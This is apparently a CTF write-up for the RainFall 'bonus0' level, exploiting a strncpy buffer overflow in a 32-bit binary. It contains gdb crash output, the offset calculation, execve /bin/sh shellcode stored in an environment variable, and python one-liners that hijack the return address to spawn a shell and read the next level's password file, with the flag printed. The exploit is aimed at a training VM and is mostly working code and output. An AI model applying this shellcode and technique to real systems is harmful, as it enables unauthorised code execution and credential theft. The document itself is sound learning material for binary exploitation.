 ▄▄                                                            ▄▄▄▄
 ██                                                           ██▀▀██
 ██▄███▄    ▄████▄   ██▄████▄  ██    ██  ▄▄█████▄            ██    ██
 ██▀  ▀██  ██▀  ▀██  ██▀   ██  ██    ██  ██▄▄▄▄ ▀            ██ ██ ██
 ██    ██  ██    ██  ██    ██  ██    ██   ▀▀▀▀██▄            ██    ██
 ███▄▄██▀  ▀██▄▄██▀  ██    ██  ██▄▄▄███  █▄▄▄▄▄██             ██▄▄██
 ▀▀ ▀▀▀      ▀▀▀▀    ▀▀    ▀▀   ▀▀▀▀ ▀▀   ▀▀▀▀▀▀               ▀▀▀▀

The first step here is to rewrite the original code in C.

We can then see that in p() we can read 4096 characters in a non null-terminated buffer.
strncpy is then called to copy at most 20 bytes and as the man says:

Warning:
If there is no null byte among the first n bytes of src,
the string placed in dest will not be null-terminated.

Also, new0[20] and new1[20] in pp() can be seen as 1 buffer of 40.
So we can copy 40 + 20 (60) chars into buf, of size 54

(gdb) run
AAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBBBBB
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/

(gdb) run
BBBBBBBBBBBBBBBBBBBB
Aa0Aa1Aa2Aa3Aa4Aa5Aa
Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? () # offset is 9

Here, the program is trying to read code at a pointer defined by our input !
We just have to write a pointer that makes sense.
Here, we cannot store our code in the Heap (no malloc)
or the Stack (the buffer that contains the input goes out of scope).
So we will store the shellcode in an env var.

We are using the same shellcode as in level 9.

On the host:
~$ gcc -m32 -o ./getenv ./bonus0/Ressources/getenv.c
~$ scp -P 4242 ./getenv bonus0@192.168.122.237:/tmp

On the VM:
bonus0@RainFall:~$ export SCODE=$(python -c 'print "\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
bonus0@RainFall:~$ /tmp/getenv SCODE
SCODE @ 0xbffff7d0 -> \xd0\xf7\xff\xbf

bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf'" > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
# Oops, the second input needs to be bigger for the exploit to work

# Let's try again:
bonus0@RainFall:~$ python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xd0\xf7\xff\xbf' + 'C'*7" > /tmp/pb0; cat /tmp/pb0 - | ./bonus0
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
